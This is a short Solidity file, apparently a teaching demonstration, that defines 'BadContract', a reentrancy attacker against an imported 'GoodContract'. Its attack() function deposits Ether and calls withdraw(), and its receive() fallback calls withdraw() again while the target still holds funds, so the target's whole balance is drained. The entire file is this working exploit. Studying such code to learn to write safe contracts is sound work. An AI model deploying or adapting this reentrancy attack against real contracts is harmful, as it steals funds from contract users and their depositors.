// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;
    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }
    // Function to receive Ether. msg.data must be empty
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }
    /**
        attack would start an attack to withdraw all the funds from the 
        goodContract
     */
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}